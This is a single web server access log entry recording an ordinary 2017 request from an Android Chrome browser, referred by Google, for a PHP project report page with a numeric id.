122.178.55.203 - - [29/May/2017:09:02:06 +0530] "GET /project_details_view_report.php?id=71 HTTP/1.1" 200 13076 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 4.4.2; MicromaxP480 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Safari/537.36"
